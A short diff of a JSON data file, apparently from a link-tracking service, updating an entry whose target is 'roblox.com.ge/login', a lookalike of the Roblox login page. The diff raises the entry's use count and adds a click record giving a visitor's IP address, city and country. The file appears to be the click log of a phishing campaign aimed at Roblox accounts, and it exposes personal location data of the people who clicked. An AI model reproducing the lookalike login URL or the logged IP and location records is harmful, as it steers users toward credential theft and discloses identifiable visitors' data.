@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1690,
+    "useCount": 1691,
     "createdBy": "admin",
     "clicks": [
       {
@@ -13688,6 +13688,14 @@
         "city": "Batangas",
         "flag": "🇵🇭",
         "countryCode": "PH"
+      },
+      {
+        "timestamp": 1777650479338,
+        "ip": "45.184.49.219",
+        "country": "Brazil",
+        "city": "Tapejara",
+        "flag": "🇧🇷",
+        "countryCode": "BR"
       }
     ]
   },
